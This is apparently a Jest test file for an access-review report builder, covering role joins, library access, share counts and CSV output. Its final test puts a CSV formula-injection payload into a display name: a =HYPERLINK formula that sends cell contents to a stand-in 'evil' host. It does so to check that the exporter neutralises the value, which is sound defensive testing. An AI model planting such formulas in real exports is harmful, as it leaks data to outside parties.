'use strict';
// Covers the access-review assembler: role/name join, explicit vs open library
// access, admin "all", direct-share counts, last-activity, and CSV shaping.
jest.mock('../../lib/db', () => ({ query: jest.fn() }));
const { assemble, toCsv } = require('../../lib/accessReview');

const NOW = new Date('2026-07-11T12:00:00.000Z');

const DATA = {
  roles: [
    { user_id: 'u1', email: 'dave@x.com', role: 'admin', assigned_at: '2026-01-01T00:00:00Z' },
    { user_id: 'u2', email: 'ann@x.com', role: 'contributor', assigned_at: '2026-02-01T00:00:00Z' },
    { user_id: 'u3', email: 'val@x.com', role: 'viewer', assigned_at: '2026-03-01T00:00:00Z' },
  ],
  profiles: [{ email: 'ann@x.com', display_name: 'Ann Smith' }],
  libraries: [{ id: 'L1', name: 'Clients' }, { id: 'L2', name: 'Ops' }, { id: 'L3', name: 'Public' }],
  // L1 + L2 have members; L3 has none → open.
  memberships: [
    { subject_email: 'ann@x.com', library_id: 'L1' },
    { subject_email: 'ann@x.com', library_id: 'L2' },
    { subject_email: 'val@x.com', library_id: 'L1' },
  ],
  lastActivity: [{ user_email: 'ann@x.com', last: '2026-07-10T09:00:00Z' }],
  shares: [{ subject_email: 'val@x.com', n: '4' }],
};

describe('assemble', () => {
  const r = assemble(DATA, NOW);

  test('reports generation time, count, and open libraries', () => {
    expect(r.generatedAt).toBe('2026-07-11T12:00:00.000Z');
    expect(r.userCount).toBe(3);
    expect(r.openLibraries).toEqual(['Public']); // L3 has no members
  });

  test('admin shows "all (admin)", not enumerated libraries', () => {
    const dave = r.users.find(u => u.email === 'dave@x.com');
    expect(dave.libraries).toEqual(['all (admin)']);
  });

  test('non-admin lists explicit memberships (sorted), joined by name/profile', () => {
    const ann = r.users.find(u => u.email === 'ann@x.com');
    expect(ann.name).toBe('Ann Smith');
    expect(ann.role).toBe('contributor');
    expect(ann.libraries).toEqual(['Clients', 'Ops']);
    expect(ann.lastActivity).toBe('2026-07-10T09:00:00Z');
    expect(ann.directShares).toBe(0);
  });

  test('direct-share count and never-active are represented', () => {
    const val = r.users.find(u => u.email === 'val@x.com');
    expect(val.directShares).toBe(4);
    expect(val.libraries).toEqual(['Clients']);
    expect(val.lastActivity).toBeNull();
  });
});

describe('toCsv', () => {
  test('emits a header comment, open-libraries note, and one row per user', () => {
    const csv = toCsv(assemble(DATA, NOW));
    const lines = csv.split('\n');
    expect(lines[0]).toContain('Memex access review');
    expect(lines[1]).toContain('Open libraries');
    expect(lines[2]).toBe('email,name,role,role_assigned,libraries,direct_shares,last_activity');
    expect(csv).toContain('ann@x.com,Ann Smith,contributor');
    // libraries joined with "; " must be quoted because of the comma-free but semicolon list
    expect(csv).toMatch(/Clients; Ops/);
    expect(lines.filter(l => l && !l.startsWith('#') && !l.startsWith('email,'))).toHaveLength(3);
  });

  test('neutralizes spreadsheet formula injection in a user-controlled name', () => {
    const data = {
      ...DATA,
      profiles: [{ email: 'ann@x.com', display_name: '=HYPERLINK("http://evil/?"&CONCAT(A1:G1),"x")' }],
    };
    const csv = toCsv(assemble(data, NOW));
    // the dangerous cell must be prefixed with an apostrophe and quoted, never emitted as a bare =formula
    expect(csv).toContain('"\'=HYPERLINK');
    expect(csv).not.toMatch(/,=HYPERLINK/);
  });
});
